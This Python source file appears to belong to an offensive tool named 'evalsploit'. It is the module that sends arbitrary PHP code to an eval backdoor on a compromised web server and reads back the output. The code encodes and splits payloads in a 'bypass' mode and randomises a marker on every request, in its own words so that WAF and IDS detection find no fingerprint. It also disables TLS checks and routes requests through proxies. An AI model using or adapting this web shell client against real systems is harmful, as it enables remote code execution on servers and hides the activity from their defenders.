"""Send PHP to backdoor: encode, POST, parse response by marker."""

from __future__ import annotations

import base64
import secrets
import time
from os import urandom
from typing import TYPE_CHECKING

import requests
from requests.exceptions import RequestException, Timeout

if TYPE_CHECKING:
    from evalsploit.context import SessionContext

# Ignore TLS warnings in pentest context
import urllib3
urllib3.disable_warnings()


def send(ctx: "SessionContext", php_code: str, timeout: int | None = 30) -> str:
    """
    Prepend a per-request random marker to payload, encode per send_mode, POST,
    return only our output.  The random marker changes every call — no static
    fingerprint for WAF/IDS detection.
    """
    marker = secrets.token_hex(8)          # 16 hex chars, unique per request
    payload = (
        f'echo "{marker}";'
        f'try{{{php_code}}}catch(Exception $e){{echo "[PHP_ERR:".$e->getMessage()."]";}}'
    )
    mode = ctx.config.send_mode
    z_key = ctx.config.Z
    v_key = ctx.config.V

    current = ctx.config.get_current_proxy()
    proxies = _proxies(current)

    if mode == "bypass":
        text = base64.b64encode(payload.encode("utf-8")).decode("utf-8")
        sep = "".join("_+=/"[c % 4] for c in urandom(4))
        list_one = sep.join(text[i : i + 4] for i in range(0, len(text), 4))
        try:
            r = requests.post(
                ctx.url,
                data={z_key: list_one, v_key: sep},
                headers={"User-Agent": ctx.uagent},
                proxies=proxies,
                verify=False,
                timeout=timeout,
            )
            return _extract(r.text, marker)
        except (RequestException, Timeout) as e:
            return f"[evalsploit error] {e!s}"

    if mode == "classic":
        encoded = base64.b64encode(payload.encode("utf-8")).decode("utf-8")
        try:
            r = requests.post(
                ctx.url,
                data={z_key: encoded, v_key: ""},
                headers={"User-Agent": ctx.uagent},
                proxies=proxies,
                verify=False,
                timeout=timeout,
            )
            return _extract(r.text, marker)
        except (RequestException, Timeout) as e:
            return f"[evalsploit error] {e!s}"

    # simple: raw eval, still extract by marker
    try:
        r = requests.post(
            ctx.url,
            data={z_key: payload},
            headers={"User-Agent": ctx.uagent},
            proxies=proxies,
            verify=False,
            timeout=timeout,
        )
        return _extract(r.text, marker)
    except (RequestException, Timeout) as e:
        return f"[evalsploit error] {e!s}"


def _proxies(proxy: str) -> dict:
    if not proxy or ":" not in proxy:
        return {}
    parts = proxy.split(":", 2)
    host, port = parts[0], parts[1]
    return {
        "http": f"http://{host}:{port}/",
        "https": f"http://{host}:{port}/",
    }


def validate_proxy(proxy_str: str, test_url: str | None = None, timeout: int = 10) -> bool:
    """Check if proxy is usable: GET test_url (or httpbin) through proxy. Returns True if 2xx."""
    proxies = _proxies(proxy_str)
    if not proxies:
        return False
    url = test_url or "https://httpbin.org/get"
    try:
        r = requests.get(url, proxies=proxies, timeout=timeout, verify=False)
        return 200 <= r.status_code < 300
    except (RequestException, Timeout):
        return False


def _extract(body: str, marker: str) -> str:
    """Return only output after marker.
    If marker is absent the backdoor didn't execute — return a diagnostic string."""
    idx = body.find(marker)
    if idx == -1:
        body_lower = body.lower()
        if any(tag in body_lower for tag in ("fatal error", "parse error", "warning:", "notice:")):
            return f"[evalsploit: PHP error]\n{body.strip()[:400]}"
        return "[evalsploit: backdoor not triggered — check URL / Z / V]"
    return body[idx + len(marker):].lstrip()


SEND_MODES = ("bypass", "classic", "simple")


def ping_with_mode(ctx: "SessionContext", mode: str, timeout: int = 30) -> tuple[bool, int]:
    """
    Try ping (echo 1;) with the given send_mode. Sets ctx.config.send_mode = mode.
    Returns (success, ms). On success, ctx.config.send_mode is left as mode.
    """
    ctx.config.send_mode = mode
    t0 = time.perf_counter()
    out = send(ctx, "echo 1;", timeout=timeout)
    ms = round((time.perf_counter() - t0) * 1000)
    if out.startswith("[evalsploit"):
        return False, ms
    ok = out.strip() == "1"
    return ok, ms
